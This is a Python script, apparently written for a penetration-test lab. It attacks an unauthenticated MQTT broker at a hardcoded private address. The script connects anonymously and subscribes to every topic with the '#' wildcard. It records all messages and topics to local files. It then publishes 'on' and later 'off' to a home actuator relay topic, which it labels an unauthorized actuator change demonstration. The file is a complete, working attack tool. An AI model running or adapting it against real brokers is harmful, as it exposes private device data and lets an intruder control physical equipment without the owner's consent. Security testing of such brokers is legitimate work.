import argparse
import sys
import time

ERROR        = '\033[91m [!!!]\033[0m'
WARNING      = '\033[93m [*]\033[0m'
NOTIFICATION = '\033[96m[+]\033[0m'
COLOUR_END   = '\033[0m'
UNDERLINE    = '\033[4m'

try:
    import paho.mqtt.client as mqtt
except ImportError:
    sys.exit("Error: paho-mqtt not installed. Run: sudo pip3 install paho-mqtt")


class finalFile_Print:
    harvestFile   = "mqtt_harvest.txt"
    topicMap_File = "mqtt_topic_map.txt"

    def __str__(self):
        return f"{self.harvestFile} and {self.topicMap_File}"


brokerHost    = "10.10.10.40"
brokerPort    = 1883
harvestSecs   = 30
actuatorTopic = "home/actuators/relay"
clientID      = "kali_probe_01"

topicSet = set()
messages = []


def on_connect(client, userdata, flags, reasonCode, properties=None):
    if reasonCode == 0:
        print(f"{NOTIFICATION} Connected to {brokerHost}:{brokerPort} anonymously — no authentication used")
        client.subscribe("#", qos=0)
        print(f"{NOTIFICATION} Wildcard '#' subscribed — all topics will be forwarded to us")
    else:
        print(f"{WARNING} MQTT Broker unable to connect on 1883 ({reasonCode})")
        sys.exit(1)


def on_message(client, userdata, msg):
    ts      = time.strftime("%H:%M:%S")
    topic   = msg.topic
    payload = msg.payload.decode("utf-8", errors="replace")
    print(f"{NOTIFICATION} [{ts}] - {topic:<35}: {payload}")

    topicSet.add(topic)
    messages.append((ts, topic, payload))


def on_disconnect(client, userdata, disconnect_flags, reasonCode, properties=None):
    if reasonCode != 0:
        print(f"{WARNING} Unexpected disconnect ({reasonCode})")
        try:
            client.connect(brokerHost, brokerPort, keepalive=60)
        except Exception as e:
            print(f"{ERROR} Connection failed: {e}")


def main():
    parser = argparse.ArgumentParser(description="Anonymous Mosquitto client (MQTT) probe")
    parser.add_argument("--time", type=int, default=harvestSecs,
                        help=f"Harvest duration in seconds (default: {harvestSecs})")
    args = parser.parse_args()

    client = mqtt.Client(
        callbackAPIVersion=mqtt.CallbackAPIVersion.VERSION2,
        client_id=clientID,
    )
    client.on_connect    = on_connect
    client.on_message    = on_message
    client.on_disconnect = on_disconnect

    print(f"{NOTIFICATION} Connecting to: {brokerHost}:{brokerPort}")
    try:
        client.connect(brokerHost, brokerPort, keepalive=30)
    except OSError as e:
        print(f"{ERROR} Connection failed: {e}")
        sys.exit(1)

    client.loop_start()

    print(f"{NOTIFICATION} Harvesting for {args.time}s")
    print(f"{UNDERLINE}Enter 'CTRL + C' to terminate early.{COLOUR_END}")
    try:
        time.sleep(args.time)
    except KeyboardInterrupt:
        print(f"\n{WARNING} Harvest attempt forcefully terminated.")

    with open(finalFile_Print.harvestFile, "w") as f:
        f.write(f"MQTT # Harvest completed — Duration: {args.time}s\n")
        f.write(f"# Broker: {brokerHost}:{brokerPort}\n")
        for ts, topic, payload in messages:
            f.write(f"{ts} {topic} {payload}\n")
    print(f"{NOTIFICATION} Harvest data placed in {finalFile_Print.harvestFile}")
    print(f"{NOTIFICATION} {len(messages)} messages saved.")

    with open(finalFile_Print.topicMap_File, "w") as f:
        f.write("MQTT # Map completed\n")
        for t in sorted(topicSet):
            f.write(t + "\n")
    print(f"{NOTIFICATION} Topic data placed in {finalFile_Print.topicMap_File}")
    print(f"{NOTIFICATION} {len(topicSet)} topics discovered.")

    print(f"\n{NOTIFICATION} Unauthorized actuator change demonstration on: '{actuatorTopic}'")
    rc, mid = client.publish(actuatorTopic, payload="on", qos=0)
    if rc == mqtt.MQTT_ERR_SUCCESS:
        print(f"{NOTIFICATION} Published: {actuatorTopic} = on")
        print(f"{NOTIFICATION} RELAY ACTIVE")
    else:
        print(f"{WARNING} Publish returned rc={rc}")
        print(f"{UNDERLINE}Reassess broker connection before reattempting.{COLOUR_END}")

    time.sleep(2)

    client.publish(actuatorTopic, payload="off", qos=0)
    print(f"{NOTIFICATION} Published: {actuatorTopic} = off")
    print(f"{WARNING} Relay reset — all changes reversed.")
    time.sleep(1)

    client.loop_stop()
    client.disconnect()

    print("\n" + "-" * 60)
    print(f"{NOTIFICATION} Probing complete.")
    print(f"Refer to {finalFile_Print()} for relevant information.")


if __name__ == "__main__":
    main()